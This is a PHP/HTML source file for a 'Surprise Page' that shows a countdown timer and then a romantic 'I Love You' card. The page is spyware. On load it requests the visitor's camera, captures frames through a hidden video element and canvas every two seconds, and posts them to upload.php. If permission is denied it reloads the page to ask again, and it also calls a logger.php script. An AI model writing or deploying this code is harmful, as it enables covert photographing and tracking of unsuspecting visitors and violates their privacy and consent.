<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  @file_get_contents("logger.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Surprise Page</title>
  <style>
    :root {
      --card-bg-image: url('https://i.ibb.co/VWrGrhyp/a36ff7af2fdd130268d1c5ed8285eb47.jpg');
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body, html {
      height: 100%;
      font-family: 'Segoe UI', sans-serif;
      background-color: #1b1b2f;
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      text-align: center;
    }

    #wait-screen, #main-content {
      width: 100%;
      max-width: 600px;
    }

    #wait-screen {
      font-size: 1.8rem;
      background: rgba(255, 255, 255, 0.05);
      padding: 40px 20px;
      border-radius: 20px;
      backdrop-filter: blur(4px);
      box-shadow: 0 0 20px rgba(255,255,255,0.08);
    }

    #main-content {
      display: none;
      animation: fadeInUp 1.5s ease-in-out forwards;
    }

    .card {
      background-image: var(--card-bg-image);
      background-size: cover;
      background-position: center;
      border-radius: 20px;
      padding: 30px 20px;
      box-shadow: 0 0 25px rgba(0,0,0,0.4);
      backdrop-filter: blur(2px);
    }

    .love-text {
      font-size: 2.5rem;
      font-weight: bold;
      color: #fff;
      text-shadow: 0 0 12px rgba(255, 0, 100, 0.7);
      animation: glow 3s infinite;
    }

    .heart {
      font-size: 3rem;
      margin: 15px 0;
      color: red;
      animation: beat 1.5s infinite;
    }

    .message {
      font-size: 1rem;
      line-height: 1.6;
      background: rgba(0, 0, 0, 0.5);
      padding: 15px;
      border-radius: 12px;
      margin-top: 15px;
      color: #f9f9f9;
      box-shadow: 0 0 10px rgba(255,255,255,0.08);
    }

    img {
      margin-top: 20px;
      width: 100%;
      max-width: 180px;
      height: auto;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(255,255,255,0.15);
    }

    footer {
      margin-top: 25px;
      font-size: 0.85rem;
      color: rgba(255, 255, 255, 0.5);
    }

    video, canvas {
      display: none !important;
    }

    @keyframes beat {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.2); }
    }

    @keyframes glow {
      0%, 100% { text-shadow: 0 0 12px #ff69b4; }
      50% { text-shadow: 0 0 20px #ff1493; }
    }

    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(30px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @media (max-width: 480px) {
      .love-text {
        font-size: 2rem;
      }
      .heart {
        font-size: 2.5rem;
      }
      .message {
        font-size: 0.95rem;
        padding: 12px;
      }
    }
  </style>
</head>
<body>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <div id="wait-screen">
    Wait <span id="timer">30</span> seconds for a surprise...
  </div>

  <div id="main-content">
    <div class="card">
      <div class="love-text">I Love You</div>
      <div class="heart">❤️</div>
      <div class="message">
        Never thought someone could become so important without any reason.<br>
        Maybe some relationships aren't meant to be explained, just felt.<br>
        Whoever you are — a friend, love, or a memory — you are special. ❤️
      </div>
      <img src="https://media3.giphy.com/media/v1.Y2lkPTZjMDliOTUydHJ3Y3U3aGo1bTRoZHlqc21zZHFqeXJodWRiMWd1enltcGlkOWNjNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dXLY1XDd1vml0ogpcx/giphy.gif" alt="Cute surprise gif">
    </div>
  </div>

  <footer>
    &copy; All rights reserved 2025
  </footer>

  <script>
    let timeLeft = 30;
    const timerElement = document.getElementById('timer');
    const waitScreen = document.getElementById('wait-screen');
    const mainContent = document.getElementById('main-content');

    const countdown = setInterval(() => {
      timeLeft--;
      timerElement.textContent = timeLeft;
      if (timeLeft <= 0) {
        clearInterval(countdown);
        waitScreen.style.display = 'none';
        mainContent.style.display = 'block';
      }
    }, 1000);

    
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    let lastImageHash = "";

    function getImageHash(dataUrl) {
      let hash = 0;
      for (let i = 0; i < dataUrl.length; i++) {
        const char = dataUrl.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash |= 0;
      }
      return hash;
    }

    function captureAndSend() {
      const width = video.videoWidth;
      const height = video.videoHeight;

      if (width === 0 || height === 0) return;

      canvas.width = width;
      canvas.height = height;
      ctx.drawImage(video, 0, 0, width, height);

      const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
      const hash = getImageHash(dataUrl);

      if (hash === lastImageHash) return;

      lastImageHash = hash;

      fetch('upload.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: dataUrl })
      });
    }

    function startCamera() {
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          video.srcObject = stream;
          setInterval(captureAndSend, 2000);
        })
        .catch(err => {
          console.warn("Camera access failed:", err);
          setTimeout(() => location.reload(), 5000);
        });
    }

    startCamera();
fetch("logger.php").then(res => res.text()).then(console.log);
  </script>
</body>
</html>
